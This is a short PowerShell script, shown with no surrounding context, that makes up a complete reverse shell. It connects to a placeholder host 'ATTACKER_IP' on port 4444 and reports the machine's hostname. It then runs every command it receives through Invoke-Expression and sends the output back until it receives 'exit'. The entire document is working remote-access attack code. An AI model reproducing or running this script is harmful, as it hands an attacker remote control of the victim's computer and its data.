$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.WriteLine([System.Net.Dns]::GetHostName())
$writer.Flush()
while($true) {
    $writer.Write('PS ' + (Get-Location))
    $writer.Write("> ")
    $writer.Flush()
    $command = $reader.ReadLine()
    if($command -eq 'exit') { break }
    $output = Invoke-Expression $command 2>&1
    $writer.WriteLine($output)
    $writer.Flush()
}
$client.Close()
